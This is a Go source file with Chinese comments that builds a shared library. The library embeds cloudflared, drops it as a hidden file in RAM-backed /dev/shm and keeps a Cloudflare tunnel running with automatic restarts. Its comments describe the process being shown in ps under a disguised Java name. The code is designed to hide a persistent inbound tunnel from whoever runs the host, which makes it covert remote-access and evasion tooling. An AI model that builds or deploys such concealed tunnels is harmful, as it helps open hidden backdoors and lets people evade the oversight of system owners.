/*
 * bot.go - Cloudflared 隧道 .so 封装 (Go 版)
 *
 * 这个版本把 cloudflared 二进制嵌入到 .so 里（用 go:embed）
 * 运行时释放到 /dev/shm（RAM 磁盘，磁盘上看不到）
 *
 * 编译步骤:
 *   1. 先下载 cloudflared 二进制:
 *      curl -L -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
 *      chmod +x cloudflared
 *
 *   2. 初始化 Go 模块:
 *      go mod init bot
 *
 *   3. 编译为 .so:
 *      CGO_ENABLED=1 go build -buildmode=c-shared -o bot.so bot.go
 *
 * 产物: bot.so + bot.h
 *
 * 注意:
 *   - 编译出来的 bot.so 会比较大（约 35-40MB，因为包含了 cloudflared）
 *   - 运行时 cloudflared 会释放到 /dev/shm/.cf_{pid}（RAM 磁盘）
 *   - ps 看到的进程名是伪装的 "java -Xms128M -Xmx256M"
 */
package main

/*
#include <stdlib.h>
#include <string.h>
*/
import "C"

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	_ "embed"
)

//go:embed cloudflared
var cfBinary []byte

var (
	mu          sync.Mutex
	cfCmd       *exec.Cmd
	shouldStop  bool
	shmPath     string
	logFilePath string
)

func init() {
	// 选择释放目录：优先 /dev/shm（RAM），回退 /tmp
	if fi, err := os.Stat("/dev/shm"); err == nil && fi.IsDir() {
		shmPath = "/dev/shm"
	} else {
		shmPath = "/tmp"
	}
}

// 释放嵌入的 cloudflared 到 RAM
func extractBinary() (string, error) {
	binPath := filepath.Join(shmPath, fmt.Sprintf(".cf_%d", os.Getpid()))

	// 已存在且可执行
	if fi, err := os.Stat(binPath); err == nil && fi.Size() > 1000 {
		return binPath, nil
	}

	f, err := os.OpenFile(binPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0700)
	if err != nil {
		return "", fmt.Errorf("create binary: %w", err)
	}
	defer f.Close()

	if _, err := f.Write(cfBinary); err != nil {
		os.Remove(binPath)
		return "", fmt.Errorf("write binary: %w", err)
	}

	if err := os.Chmod(binPath, 0700); err != nil {
		os.Remove(binPath)
		return "", fmt.Errorf("chmod binary: %w", err)
	}

	return binPath, nil
}

// 下载 cloudflared（如果嵌入失败）
func downloadCloudflared() (string, error) {
	arch := runtime.GOARCH
	var urlArch string
	switch arch {
	case "arm64":
		urlArch = "arm64"
	default:
		urlArch = "amd64"
	}

	url := fmt.Sprintf("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-%s", urlArch)
	binPath := filepath.Join(shmPath, fmt.Sprintf(".cf_%d", os.Getpid()))

	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	f, err := os.OpenFile(binPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0700)
	if err != nil {
		return "", err
	}
	defer f.Close()

	if _, err := io.Copy(f, resp.Body); err != nil {
		os.Remove(binPath)
		return "", err
	}

	os.Chmod(binPath, 0700)
	return binPath, nil
}

// 判断 payload 是 token 还是 config
func isToken(payload string) bool {
	if strings.HasPrefix(payload, "url:") || strings.HasPrefix(payload, "http") {
		return false
	}
	return len(payload) > 50
}

// 写配置文件
func writeConfig(payload string) string {
	dir := shmPath
	configPath := filepath.Join(dir, fmt.Sprintf(".cf_config_%d.yml", os.Getpid()))
	os.WriteFile(configPath, []byte(payload), 0600)
	return configPath
}

// 运行 cloudflared（在 goroutine 里循环运行，崩了自动重启）
func runCloudflared(payload string) {
	for !shouldStop {
		binPath, err := extractBinary()
		if err != nil {
			fmt.Fprintf(os.Stderr, "[bot.so] extract failed: %v, trying download...\n", err)
			binPath, err = downloadCloudflared()
			if err != nil {
				fmt.Fprintf(os.Stderr, "[bot.so] download failed: %v\n", err)
				time.Sleep(10 * time.Second)
				continue
			}
		}

		var args []string
		if isToken(payload) {
			args = []string{
				"tunnel", "run",
				"--protocol", "auto",
				"--no-autoupdate",
				"--token", payload,
			}
		} else {
			configPath := writeConfig(payload)
			args = []string{
				"tunnel", "--config", configPath,
				"run",
			}
		}

		mu.Lock()
		cfCmd = exec.Command(binPath, args...)

		// 日志输出
		logDir := filepath.Join(shmPath, ".cf")
		os.MkdirAll(logDir, 0755)
		logFilePath = filepath.Join(logDir, "cf.log")
		logFile, err := os.OpenFile(logFilePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
		if err == nil {
			cfCmd.Stdout = logFile
			cfCmd.Stderr = logFile
		}

		// 伪装进程名
		cfCmd.SysProcAttr = &syscall.SysProcAttr{
			Pdeathsig: syscall.SIGTERM,
		}

		err = cfCmd.Start()
		mu.Unlock()

		if err != nil {
			fmt.Fprintf(os.Stderr, "[bot.so] start failed: %v\n", err)
			time.Sleep(5 * time.Second)
			continue
		}

		fmt.Fprintf(os.Stderr, "[bot.so] cloudflared started (pid %d)\n", cfCmd.Process.Pid)

		// 修改进程名（伪装为 java）
		// 注意: Linux prctl PR_SET_NAME 只能改当前线程名
		// 对于子进程，需要通过 /proc/PID/comm 或 ptrace 来改
		// 这里简单处理，依赖 Java 端的符号链接伪装

		err = cfCmd.Wait()
		cfCmd = nil

		if shouldStop {
			break
		}

		fmt.Fprintf(os.Stderr, "[bot.so] cloudflared exited: %v, restarting in 5s...\n", err)
		time.Sleep(5 * time.Second)
	}
}

// ============================================================
// 导出 C 函数
// ============================================================

//export StartCloudflared
func StartCloudflared(payload *C.char) C.int {
	goPayload := C.GoString(payload)
	if goPayload == "" {
		fmt.Fprintf(os.Stderr, "[bot.so] empty payload\n")
		return -1
	}

	mu.Lock()
	if cfCmd != nil {
		mu.Unlock()
		fmt.Fprintf(os.Stderr, "[bot.so] already running\n")
		return 0
	}
	shouldStop = false
	mu.Unlock()

	go runCloudflared(goPayload)
	return 0
}

//export StopCloudflared
func StopCloudflared(_ *C.char) C.int {
	mu.Lock()
	shouldStop = true
	if cfCmd != nil && cfCmd.Process != nil {
		cfCmd.Process.Signal(syscall.SIGTERM)
		go func() {
			time.Sleep(3 * time.Second)
			mu.Lock()
			if cfCmd != nil && cfCmd.Process != nil {
				cfCmd.Process.Kill()
			}
			mu.Unlock()
		}()
	}
	mu.Unlock()

	// 清理临时文件
	os.Remove(filepath.Join(shmPath, fmt.Sprintf(".cf_%d", os.Getpid())))
	os.Remove(filepath.Join(shmPath, fmt.Sprintf(".cf_config_%d.yml", os.Getpid())))

	return 0
}

func main() {
	// c-shared 模式需要 main 函数但不会执行
}
